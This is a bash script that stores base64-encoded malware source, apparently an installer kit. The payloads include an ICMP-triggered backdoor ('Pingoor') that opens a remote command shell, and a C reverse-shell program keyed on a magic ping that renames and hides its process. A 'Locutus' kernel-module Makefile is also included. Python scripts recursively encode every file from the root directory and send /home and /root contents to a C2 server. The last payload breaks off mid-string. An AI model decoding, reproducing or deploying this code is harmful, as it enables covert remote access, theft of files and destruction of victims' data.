#!/bin/bash

PINGOOR_MAIN_SRC="I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8bmV0aW5ldC9pcC5oPgojaW5jbHVkZSA8bmV0aW5ldC9pcF9pY21wLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSAicGluZ29vci5oIgoKdm9pZCBiYW5uZXIoKSB7CiAgICBwcmludGYoIiVzIiwgIlx4MWJbMzFtIik7CiAgICBwcmludGYoUiJFT0YoICBfX19fXyBfICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiB8ICBfXyAoXykgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogfCB8X18pIHwgXyBfXyAgIF9fIF8gIF9fXyAgIF9fXyAgXyBfXyAKIHwgIF9fXy8gfCAnXyBcIC8gX2AgfC8gXyBcIC8gXyBcfCAnX198CiB8IHwgICB8IHwgfCB8IHwgKF98IHwgKF8pIHwgKF8pIHwgfCAgIAogfF98ICAgfF98X3wgfF98XF9fLCB8XF9fXy8gXF9fXy98X3wgICAKCSAgICAgICAgIF9fLyB8ICAgICAgICAgICAgICAgICAKCSAgICAgICAgfF9fXy8gICAgICAgICAgICAgICAgICAKCilFT0YiKTsKCiAgICBwdXRzKCIJICAgXHgxYlszMW1bXHgxYlttQ29kZWQgYnkgTXJFbXB5XHgxYlszMW1dXG4iKTsKfQoKY2hhciogZXhlY21kKGNoYXIqIGNtZCwgY2hhciogY21kb3V0cHV0LCBzaXplX3QgYnVmZnNpemUpIHsKICAgIEZJTEUqIGZjbWQ7CiAgICBjaGFyIHBhdGhbYnVmZnNpemVdOwoKICAgIGZjbWQgPSBwb3BlbihjbWQsICJyIik7CiAgICBpZiAoZmNtZCA9PSBOVUxMKSB7CiAgICAgICAgcHJpbnRmKCJceDFiWzMxbVstXVx4MWJbbSBGYWlsZWQgdG8gcnVuIGNvbW1hbmRcbiIpOwogICAgICAgIGV4aXQoMSk7CiAgICB9CgogICAgd2hpbGUgKGZnZXRzKHBhdGgsIHNpemVvZihwYXRoKSwgZmNtZCkgIT0gTlVMTCkgewogICAgICAgIHN0cm5jYXQoY21kb3V0cHV0LCBwYXRoLCBzdHJsZW4ocGF0aCkpOwogICAgfQogICAgCiAgICBwY2xvc2UoZmNtZCk7CiAgICByZXR1cm4gY21kb3V0cHV0Owp9CgppbnQgY2hhbmdlZGlyKGNoYXIqIGJ1ZmZlciwgY2hhciogcGF0aCkgewogICAgaW50IGk7CiAgICBpbnQgajsKICAgIGJ6ZXJvKHBhdGgsIEJVRkZFUik7CiAgICBmb3IgKGkgPSAzLCBqID0gMDsgaSA8IDI1NjsgaSsrLCBqKyspIHsKICAgICAgICBpZihidWZmZXJbaV0gPT0gJ1xuJykgYnJlYWs7CiAgICAgICAgcGF0aFtqXSA9IGJ1ZmZlcltpXTsKICAgIH0KCiAgICBpZiAoY2hkaXIocGF0aCkgIT0gMCkgewogICAgICAgIHJldHVybiAxOwogICAgfQoKICAgIHJldHVybiAwOwp9CgppbnQgbWFpbigpIHsKICAgIGludCBzb2NrID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX0lDTVApOwogICAgaWYgKHNvY2sgPCAwKSB7CiAgICBwZXJyb3IoIlx4MWJbMzFtWy1dXHgxYlttIEZhaWxlZCB0byBjcmVhdGUgc29ja2V0Iik7CiAgICByZXR1cm4gMTsKICAgIH0KCiAgICBzdHJ1Y3Qgc29ja2FkZHJfaW4gYWRkcjsKICAgIG1lbXNldCgmYWRkciwgMCwgc2l6ZW9mKGFkZHIpKTsKICAgIGFkZHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7CiAgICBhZGRyLnNpbl9hZGRyLnNfYWRkciA9IElOQUREUl9BTlk7CiAgICBpZiAoYmluZChzb2NrLCAoc3RydWN0IHNvY2thZGRyKikmYWRkciwgc2l6ZW9mKGFkZHIpKSA8IDApIHsKICAgICAgICBwZXJyb3IoIlx4MWJbMzFtWy1dXHgxYlttIEZhaWxlZCB0byBiaW5kIHRoZSBzb2NrZXQiKTsKICAgICAgICByZXR1cm4gMTsKICAgIH0KCiAgICBiYW5uZXIoKTsKICAgIHB1dHMoIlx4MWJbMzJtWytdXHgxYlttIEJhY2tkb29yIGluaXRpYWxpemVkISIpOwogICAgd2hpbGUgKDEpIHsKICAgICAgICBjaGFyIGJ1ZmZlcltCVUZGRVJdOwogICAgICAgIGludCBieXRlc19yZWFkID0gcmVhZChzb2NrLCBidWZmZXIsIHNpemVvZihidWZmZXIpKTsKICAgICAgICBzdHJ1Y3QgaXBoZHIgKmlwX2hlYWRlciA9IChzdHJ1Y3QgaXBoZHIqKWJ1ZmZlcjsKCiAgICAgICAgaWYgKGlwX2hlYWRlci0+c2FkZHIgPT0gaW5ldF9hZGRyKFNFUlZFUklQKSkgewogICAgICAgICAgICBwcmludGYoIlx4MWJbMzJtWytdXHgxYlttIElDTVAgcGFja2V0IHJlY2VpdmVkIGZyb20gJXNcbiIsIFNFUlZFUklQKTsKCiAgICAgICAgICAgIHBpZF90IHBpZCA9IGZvcmsoKTsKICAgICAgICAgICAgaWYgKHBpZCA9PSAwKSB7CiAgICAgICAgICAgICAgICBjaGFyIGJ1ZmZlcltCVUZGRVJdOwogICAgICAgICAgICAgICAgY2hhciBjbWRvdXRwdXRbQlVGRkVSXTsKICAgICAgICAgICAgICAgIGNoYXIgcGF0aFtCVUZGRVJdOwogICAgICAgICAgICAgICAgaW50IHNoc29jayA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCk7CiAgICAgICAgICAgICAgICBpZiAoc2hzb2NrID09IC0xKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHBlcnJvcigiXHgxYlszMW1bLV1ceDFiW20gRmFpbGVkIHRvIGNyZWF0ZSBzb2NrIik7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgc3RydWN0IHNvY2thZGRyX2luIHNoYWRkcjsKICAgICAgICAgICAgICAgIHNoYWRkci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsKICAgICAgICAgICAgICAgIHNoYWRkci5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoU0VSVkVSSVApOwogICAgICAgICAgICAgICAgc2hhZGRyLnNpbl9wb3J0ID0gaHRvbnMoU0VSVkVSUE9SVCk7CiAgICAgICAgICAgICAgICBpZiAoY29ubmVjdChzaHNvY2ssIChzdHJ1Y3Qgc29ja2FkZHIqKSZzaGFkZHIsIHNpemVvZihzaGFkZHIpKSA9PSAtMSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBwZXJyb3IoIlx4MWJbMzFtWy1dXHgxYlttIEZhaWxlZCB0byBjb25uZWN0Iik7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgd2hpbGUgKDEpIHsKICAgICAgICAgICAgICAgICAgICBiemVybyhidWZmZXIsIEJVRkZFUik7CiAgICAgICAgICAgICAgICAgICAgYnplcm8oY21kb3V0cHV0LCBCVUZGRVIpOwoJCSAgICB3cml0ZShzaHNvY2ssICJceDFiWzM3bVtceDFiWzMxbWhhY2tlclx4MWJbMzdtQFx4MWJbMzRtbWFjaGluZVx4MWJbMzdtXS1ceDFiWzMxbT5ceDFiW20gIiwgNTMpOwogICAgICAgICAgICAgICAgICAgIHJlYWQoc2hzb2NrLCBidWZmZXIsIEJVRkZFUik7CgogICAgICAgICAgICAgICAgICAgIGV4ZWNtZChidWZmZXIsIGNtZG91dHB1dCwgQlVGRkVSKTsKCiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cm5jbXAoYnVmZmVyLCAiY2QgIiwgMykgPT0gMCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2hhbmdlZGlyKGJ1ZmZlciwgcGF0aCkgIT0gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGUoc2hzb2NrLCAiXHgxYlszMW1bLV1ceDFiW20gVW5hYmxlIHRvIHN3aXRjaCBkaXJlY3RvcnlcbiIsIDMyKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoc3RybmNtcChidWZmZXIsICJleGl0XG4iLCA1KSA9PSAwKSB7CgkJCXdyaXRlKHNoc29jaywgIlx4MWJbMzRtWypdXHgxYlttIEJ5ZSBieWUhXG4iLCAxNCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNsb3NlKHNoc29jayk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHdyaXRlKHNoc29jaywgY21kb3V0cHV0LCBCVUZGRVIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcHJpbnRmKCJceDFiWzMybVsrXVx4MWJbbSBJQ01QIHBhY2tldCByZWNlaXZlZCBmcm9tIGFub3RoZXIgSVBcbiIpOwogICAgICAgIH0KICAgIH0KCiAgICByZXR1cm4gMDsKfQ=="
PINGOOR_HEADER="I2lmbmRlZiBQSU5HT09SCiNkZWZpbmUgUElOR09PUgoKI2RlZmluZSBTRVJWRVJJUCAiMTI3LjAuMC4xIgojZGVmaW5lIFNFUlZFUlBPUlQgMTIzNAojZGVmaW5lIEJVRkZFUiA0MDk2Cgp2b2lkIGJhbm5lcigpOwpjaGFyKiBleGVjbWQoY2hhciogY21kLCBjaGFyKiBjbWRvdXRwdXQsIHNpemVfdCBidWZmc2l6ZSk7CmludCBjaGFuZ2VkaXIoY2hhciogYnVmZmVyLCBjaGFyKiBwYXRoKTsKCiNlbmRpZg=="

LOCUTUS_MAKEFILE="b2JqLW0rPWxvY3V0dXMubwoKYWxsOgoJbWFrZSAtQyAvbGliL21vZHVsZXMvJChzaGVsbCB1bmFtZSAtcikvYnVpbGQvIE09JChQV0QpIG1vZHVsZXMKY2xlYW46CgltYWtlIC1DIC9saWIvbW9kdWxlcy8kKHNoZWxsIHVuYW1lIC1yKS9idWlsZC8gTT0kKFBXRCkgY2xlYW4="
LOCUTUS_BROG_TRANSWARP="I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4gCiNpbmNsdWRlIDxlcnJuby5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN0ZGFyZy5oPgojaW5jbHVkZSA8bmV0ZGIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8Y3R5cGUuaD4KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4KI2luY2x1ZGUgPG5ldGluZXQvaW5fc3lzdG0uaD4KI2luY2x1ZGUgPG5ldGluZXQvaXAuaD4KI2luY2x1ZGUgPG5ldGluZXQvaXBfaWNtcC5oPgojaW5jbHVkZSA8c3lzL3NvY2tldC5oPgojaW5jbHVkZSA8YXJwYS9pbmV0Lmg+CiNpbmNsdWRlIDxzaWduYWwuaD4KCiNkZWZpbmUgUEFDS0VUX1NJWkUgCTEwMjQKI2RlZmluZSBLRVkgICAgICAgICAJImphY2tfY3J1c2hlciIKI2RlZmluZSBNT1REICAgICAgICAJIi9iaW4vYmFzaFxuIgojZGVmaW5lIFNIRUxMICAgICAgIAkiL2Jpbi9iYXNoIgojZGVmaW5lIFBST0NFU1NfTkFNRSAgICAiYmFja2Rvb3IiCgoKdm9pZCBoaWRlX3Byb2Nlc3MoKQp7CiAgICBjaGFyIGNtZFs1MF07CiAgICBwaWRfdCBwaWQgPSBnZXRwaWQoKTsKICAgIHNwcmludGYoY21kLCAia2lsbCAtNjMgJWkiLCAoaW50KSBwaWQpOwogICAgc3lzdGVtKGNtZCk7Cn0KCgovKgogKiBTdGFydCB0aGUgcmV2ZXJzZSBzaGVsbAogKi8Kdm9pZCByZXZlcnNlX3NoZWxsKGNoYXIgKmF0dGFja2VyX2lwLCB1bnNpZ25lZCBzaG9ydCBpbnQgYXR0YWNrZXJfcG9ydCl7CiAgICBpbnQgc29jazsKICAgIGNoYXIgc2VydmljZVsxNV07CiAgICBzdHJ1Y3QgYWRkcmluZm8gKmFkZHJfaW5mbywgaGludHMsICp0bXA7CiAgICAKICAgIHNwcmludGYoc2VydmljZSwgIiVkIiwgYXR0YWNrZXJfcG9ydCk7CgogICAgbWVtc2V0KCZoaW50cywgMCwgc2l6ZW9mKHN0cnVjdCBhZGRyaW5mbykpOwogICAgaGludHMuYWlfZmFtaWx5ID0gQUZfSU5FVDsKCiAgICBpZihnZXRhZGRyaW5mbyhhdHRhY2tlcl9pcCwgc2VydmljZSwgJmhpbnRzLCAmYWRkcl9pbmZvKSA8IDApewogICAgICAgIHJldHVybjsKICAgIH0KCiAgICBmb3IgKHRtcCA9IGFkZHJfaW5mbzsgdG1wICE9IE5VTEw7IHRtcCA9IHRtcC0+YWlfbmV4dCl7CiAgICAgICAgc29jayA9IHNvY2tldCh0bXAtPmFpX2ZhbWlseSwgdG1wLT5haV9zb2NrdHlwZSwgdG1wLT5haV9wcm90b2NvbCk7CiAgICAgICAgaWYoc29jayA8IDApCWNvbnRpbnVlOwoKICAgICAgICBpZihjb25uZWN0KHNvY2ssIGFkZHJfaW5mby0+YWlfYWRkciwgYWRkcl9pbmZvLT5haV9hZGRybGVuKSA9PSAwKXsKICAgICAgICAgICAgLyogc3VjY2VzcyAqLwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgY2xvc2Uoc29jayk7CiAgICB9CiAgICBpZih0bXAgPT0gTlVMTCl7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgZnJlZWFkZHJpbmZvKGFkZHJfaW5mbyk7CgoJLy9QcmludCBoZWFkZXIKICAgIHdyaXRlKHNvY2ssIE1PVEQsIHN0cmxlbihNT1REKSk7CiAgICAKICAgIC8qIAogCSAqIENvbm5lY3Qgc29ja2V0IHRvIHN0ZGlvCiAJICogUnVuIHNoZWxsIAogCSAqLwogICAgZHVwMihzb2NrLCAwKTsgCiAgICBkdXAyKHNvY2ssIDEpOyAKICAgIGR1cDIoc29jaywgMik7CiAgICBleGVjbChTSEVMTCwgU0hFTEwsIChjaGFyICopMCk7CiAgICBjbG9zZShzb2NrKTsKfQoKLyoKICogSUNNUCBwYWNrZXQgbW9kZQogKi8Kdm9pZCBwaW5nX2xpc3RlbmVyKHZvaWQpewoJaW50IHNvY2tmZDsKCWludCBuOwkKCWludCBpY21wX2tzaXplOwogICAgY2hhciBidWZbUEFDS0VUX1NJWkUgKyAxXTsKICAgIHN0cnVjdCBpcCAqaXA7CglzdHJ1Y3QgaWNtcCAqaWNtcDsKCglpY21wX2tzaXplID0gc3RybGVuKEtFWSk7CiAgICBzb2NrZmQgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19SQVcsIElQUFJPVE9fSUNNUCk7CiAgICAvLyBMaXN0ZW4gZm9yIGljbXAgcGFja2V0cwoJd2hpbGUoMSl7CiAgICAgICAgLyogZ2V0IHRoZSBpY21wIHBhY2tldCAqLwogICAgICAgIGJ6ZXJvKGJ1ZiwgUEFDS0VUX1NJWkUgKyAxKTsgICAgICAgIAogICAgICAgIG4gPSByZWN2KHNvY2tmZCwgYnVmLCBQQUNLRVRfU0laRSwwKTsKCQlpZihuID4gMCl7ICAgIAogICAgICAgICAgICBpcCA9IChzdHJ1Y3QgaXAgKilidWY7CiAgICAgICAgICAgIGljbXAgPSAoc3RydWN0IGljbXAgKikoaXAgKyAxKTsKICAgICAgICAgICAgCgkJCS8vIElmIElDTVBfRUNITyBwYWNrZXQgYW5kIGlmIEtFWSBtYXRjaGVzICAqLwogICAgICAgICAgICBpZigoaWNtcC0+aWNtcF90eXBlID09IElDTVBfRUNITykgJiYgKG1lbWNtcChpY21wLT5pY21wX2RhdGEsIEtFWSwgCgkJCQlpY21wX2tzaXplKSA9PSAwKSl7CiAgICAgICAgICAgICAgICBjaGFyIGF0dGFja2VyX2lwWzE2XTsKICAgICAgICAgICAgICAgIGludCBhdHRhY2tlcl9wb3J0OwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBhdHRhY2tlcl9wb3J0ID0gMDsKICAgICAgICAgICAgICAgIGJ6ZXJvKGF0dGFja2VyX2lwLCBzaXplb2YoYXR0YWNrZXJfaXApKTsKICAgICAgICAgICAgICAgIHNzY2FuZigoY2hhciAqKShpY21wLT5pY21wX2RhdGEgKyBpY21wX2tzaXplICsgMSksICIlMTVzICVkIiwgCgkJCQkJCWF0dGFja2VyX2lwLCAmYXR0YWNrZXJfcG9ydCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmKChhdHRhY2tlcl9wb3J0IDw9IDApIHx8IChzdHJsZW4oYXR0YWNrZXJfaXApIDwgNykpCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICAvKiBTdGFydGluZyByZXZlcnNlIHNoZWxsICovCiAgICAgICAgICAgICAgICBpZihmb3JrKCkgPT0gMCl7CgkJCQkJcmV2ZXJzZV9zaGVsbChhdHRhY2tlcl9pcCwgYXR0YWNrZXJfcG9ydCk7CiAgICAgICAgICAgICAgICAgICAgZXhpdChFWElUX1NVQ0NFU1MpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgovKgogKiBtYWluICgpCiAqLwppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKXsgCgkvLyBQcmV2ZW50IHpvbWJpZXMKICAgIHNpZ25hbChTSUdDTEQsIFNJR19JR04pOyAKICAgIGNoZGlyKCIvIik7CiAgICAvLyBJZiBhcmd2IGlzIGVxdWFsIHRvIC12LCBzb21lIGluZm8gd2lsbCBiZSBwcmludGVkCiAgICBpZiAoKGFyZ2MgPT0gMikgJiYgKGFyZ3ZbMV1bMF0gPT0gJy0nKSAmJiAoYXJndlsxXVsxXSA9PSAndicpKXsKICAgICAgICBmcHJpbnRmKHN0ZG91dCwgIktFWTpcdFx0XHQlc1xuIixLRVkpOwoJCWZwcmludGYoc3Rkb3V0LCAiUHJvY2VzcyBuYW1lOlx0XHQlc1xuIiwgUFJPQ0VTU19OQU1FKTsKICAgICAgICBmcHJpbnRmKHN0ZG91dCwgIlNoZWxsOlx0XHRcdCVzXG4iLCBTSEVMTCk7CiAgICB9CiAgICBpbnQgaTsKICAgIC8vIFJlbmFtaW5nIG91ciBwcm9jZXNzCiAgICBzdHJuY3B5KGFyZ3ZbMF0sIFBST0NFU1NfTkFNRSwgc3RybGVuKGFyZ3ZbMF0pKTsKICAgIGZvciAoaT0xOyBpPGFyZ2M7IGkrKyl7CiAgICAgICAgbWVtc2V0KGFyZ3ZbaV0sJyAnLCBzdHJsZW4oYXJndltpXSkpOwoJfQogICAgaWYgKGZvcmsoKSAhPSAwKQogICAgICAgIGV4aXQoRVhJVF9TVUNDRVNTKTsKICAgIAogICAgaWYgKGdldGdpZCgpICE9IDApIHsKICAgICAgICBleGl0KEVYSVRfRkFJTFVSRSk7CiAgICB9CgogICAgaGlkZV9wcm9jZXNzKCk7CgogICAgcGluZ19saXN0ZW5lcigpOwogICAgcmV0dXJuIEVYSVRfU1VDQ0VTUzsKfQ=="
LOCUTUS_DEC="IyEvYmluL3B5dGhvbjMKaW1wb3J0IG9zCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IG1hdGgKaW1wb3J0IHNvY2tldAoKYzJfYWRkcj0iIgpjMl9wb3J0PTkwMDEKCmV4Yz1bXQp0aHJlYWRzPVtdCm1heF90PTEwMDAKCgoKaWYgYzJfYWRkciAhPSIiOgogIHRyeToKICAgICAgYz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgIGMuY29ubmVjdCgoYzJfYWRkciwgYzJfcG9ydCkpCiAgICAgIGMuc2V0dGltZW91dCgzKQogIGV4Y2VwdDoKICAgICAgYz1GYWxzZQplbHNlOgogICAgYz1GYWxzZQoKZGVmIHRvQmluYXJ5KGEpOgogIGwsbT1bXSxbXQogIGZvciBpIGluIGE6CiAgICBsLmFwcGVuZChvcmQoc3RyKGkpKSkKICBmb3IgaSBpbiBsOgogICAgbS5hcHBlbmQoaW50KGJpbihpKVsyOl0pKQogIHJldHVybiBtCgpkZWYgdG9TdHJpbmcoYSk6CiAgICBsPVtdCiAgICBtPSIiCiAgICBmb3IgaSBpbiBhOgogICAgICAgIGI9MAogICAgICAgIGM9MAogICAgICAgIGs9aW50KG1hdGgubG9nMTAoaSkpKzEKICAgICAgICBmb3IgaiBpbiByYW5nZShrKToKICAgICAgICAgICAgYj0oKGklMTApKigyKipqKSkgICAKICAgICAgICAgICAgaT1pLy8xMAogICAgICAgICAgICBjPWMrYgogICAgICAgIGwuYXBwZW5kKGMpCiAgICBmb3IgeCBpbiBsOgogICAgICAgIG09bStjaHIoeCkKICAgIHJldHVybiBtCgpkZWYgZGVjb2RlKGZpbGUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlLCAiciIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgeD1mLnJlYWQoKS5yZXBsYWNlKCJ1IiwgIjEiKS5yZXBsYWNlKCJ3IiwgIjAiKS5zcGxpdCgpCiAgICAgICAgICAgICAgICBjb250ZW50PXN0cih0b1N0cmluZyhsaXN0KG1hcChpbnQsIHgpKSkpCiAgICAgICAgICAgICAgICBjb250ZW50PWNvbnRlbnQucmVwbGFjZSgiRU9MIiwgIlxuIikKICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlLCAidyIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShjb250ZW50KQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKCmRlZiBlbmNvZGUoZmlsZSk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGUsICJyIikgYXMgZjoKICAgICAgICAgICAgeD1mLnJlYWQoKS5yZXBsYWNlKCJcbiIsICJFT0wiKQogICAgICAgICAgICBjb250ZW50ID0gIiAiLmpvaW4obWFwKHN0ciwgdG9CaW5hcnkoeCkpKS5yZXBsYWNlKCIxIiwgInUiKS5yZXBsYWNlKCIwIiwgInciKQogICAgICAgIGlmIGM6CiAgICAgICAgICAgIGlmICIvaG9tZS8iIGluIGZpbGUgb3IgIi9yb290LyIgaW4gZmlsZToKICAgICAgICAgICAgICAgIGMuc2VuZChzdHIoZmlsZSkuZW5jb2RlKCkgKyBiIlxuIiArIHN0cihjb250ZW50KS5lbmNvZGUoKSArIGIiXG5FT0ZcbiIpCiAgICAgICAgd2l0aCBvcGVuKGZpbGUsICJ3IikgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShjb250ZW50KQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCmRlZiBlbmNfZGlyKGVwPSIvIik6CiAgICBleGMuYXBwZW5kKGVwKQogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZXApOgogICAgICAgIGZvciBmIGluIGZpbGVzOgogICAgICAgICAgICBkZWNvZGUob3MucGF0aC5qb2luKHJvb3QsIGYpKQogICAgICAgIGZvciBkIGluIGRpcnM6CiAgICAgICAgICAgIGlmIG9zLnBhdGguam9pbihyb290LCBkKSBub3QgaW4gZXhjOgogICAgICAgICAgICAgICAgaWYgbGVuKHRocmVhZHMpIDwgbWF4X3Q6CiAgICAgICAgICAgICAgICAgICAgdD10aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1lbmNfZGlyLCBhcmdzPShvcy5wYXRoLmpvaW4ocm9vdCwgZCksKSkKICAgICAgICAgICAgICAgICAgICB0LnN0YXJ0KCkKICAgICAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBlbmNfZGlyKG9zLnBhdGguam9pbihyb290LCBkKSkKCnBpZCA9IG9zLmZvcmsoKQppZiBwaWQgPjA6CiAgICBleGl0KDApCnQ9dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZW5jX2RpcikKdC5zdGFydCgpCnRocmVhZHMuYXBwZW5kKHQpCnQ9dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZW5jX2RpcixhcmdzPSgiL2hvbWUvIiwpKQp0LnN0YXJ0KCkKdGhyZWFkcy5hcHBlbmQodCkKdD10aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1lbmNfZGlyLCBhcmdzPSgiL3Jvb3QvIiwpKQp0LnN0YXJ0KCkKdGhyZWFkcy5hcHBlbmQodCkKcHJpbnQoInV3dS4uLiIpCmZvciB0IGluIHRocmVhZHM6CiAgICB0LmpvaW4oKQogICAgZGVsIHQKcHJpbnQoInV3dSEhISIpCmlmIGM6CiAgICBjLmNsb3NlKCk="
LOCUTUS_ENC="IyEvYmluL3B5dGhvbjMKaW1wb3J0IG9zCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IG1hdGgKaW1wb3J0IHNvY2tldAoKYzJfYWRkcj0iIgpjMl9wb3J0PTkwMDEKCmV4Yz1bXQp0aHJlYWRzPVtdCm1heF90PTEwMDAKCgoKaWYgYzJfYWRkciAhPSIiOgogIHRyeToKICAgICAgYz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgIGMuY29ubmVjdCgoYzJfYWRkciwgYzJfcG9ydCkpCiAgICAgIGMuc2V0dGltZW91dCgzKQogIGV4Y2VwdDoKICAgICAgYz1GYWxzZQplbHNlOgogICAgYz1GYWxzZQoKZGVmIHRvQmluYXJ5KGEpOgogIGwsbT1bXSxbXQogIGZvciBpIGluIGE6CiAgICBsLmFwcGVuZChvcmQoc3RyKGkpKSkKICBmb3IgaSBpbiBsOgogICAgbS5hcHBlbmQoaW50KGJpbihpKVsyOl0pKQogIHJldHVybiBtCgpkZWYgdG9TdHJpbmcoYSk6CiAgICBsPVtdCiAgICBtPSIiCiAgICBmb3IgaSBpbiBhOgogICAgICAgIGI9MAogICAgICAgIGM9MAogICAgICAgIGs9aW50KG1hdGgubG9nMTAoaSkpKzEKICAgICAgICBmb3IgaiBpbiByYW5nZShrKToKICAgICAgICAgICAgYj0oKGklMTApKigyKipqKSkgICAKICAgICAgICAgICAgaT1pLy8xMAogICAgICAgICAgICBjPWMrYgogICAgICAgIGwuYXBwZW5kKGMpCiAgICBmb3IgeCBpbiBsOgogICAgICAgIG09bStjaHIoeCkKICAgIHJldHVybiBtCgpkZWYgZGVjb2RlKGZpbGUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlLCAiciIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgeD1mLnJlYWQoKS5yZXBsYWNlKCJ1IiwgIjEiKS5yZXBsYWNlKCJ3IiwgIjAiKS5zcGxpdCgpCiAgICAgICAgICAgICAgICBjb250ZW50PXN0cih0b1N0cmluZyhsaXN0KG1hcChpbnQsIHgpKSkpCiAgICAgICAgICAgICAgICBjb250ZW50PWNvbnRlbnQucmVwbGFjZSgiRU9MIiwgIlxuIikKICAgICAgICAgICAgICAgIHdpdGggb3BlbihmaWxlLCAidyIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShjb250ZW50KQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKCmRlZiBlbmNvZGUoZmlsZSk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGUsICJyIikgYXMgZjoKICAgICAgICAgICAgeD1mLnJlYWQoKS5yZXBsYWNlKCJcbiIsICJFT0wiKQogICAgICAgICAgICBjb250ZW50ID0gIiAiLmpvaW4obWFwKHN0ciwgdG9CaW5hcnkoeCkpKS5yZXBsYWNlKCIxIiwgInUiKS5yZXBsYWNlKCIwIiwgInciKQogICAgICAgIGlmIGM6CiAgICAgICAgICAgIGlmICIvaG9tZS8iIGluIGZpbGUgb3IgIi9yb290LyIgaW4gZmlsZToKICAgICAgICAgICAgICAgIGMuc2VuZChzdHIoZmlsZSkuZW5jb2RlKCkgKyBiIlxuIiArIHN0cihjb250ZW50KS5lbmNvZGUoKSArIGIiXG5FT0ZcbiIpCiAgICAgICAgd2l0aCBvcGVuKGZpbGUsICJ3IikgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShjb250ZW50KQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCmRlZiBlbmNfZGlyKGVwPSIvIik6CiAgICBleGMuYXBwZW5kKGVwKQogICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsoZXApOgogICAgICAgIGZvciBmIGluIGZpbGVzOgogICAgICAgICAgICBlbmNvZGUob3MucGF0aC5qb2luKHJvb3QsIGYpKQogICAgICAgIGZvciBkIGluIGRpcnM6CiAgICAgICAgICAgIGlmIG9zLnBhdGguam9pbihyb290LCBkKSBub3QgaW4gZXhjOgogICAgICAgICAgICAgICAgaWYgbGVuKHRocmVhZHMpIDwgbWF4X3Q6CiAgICAgICAgICAgICAgICAgICAgdD10aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1lbmNfZGlyLCBhcmdzPShvcy5wYXRoLmpvaW4ocm9vdCwgZCksKSkKICAgICAgICAgICAgICAgICAgICB0LnN0YXJ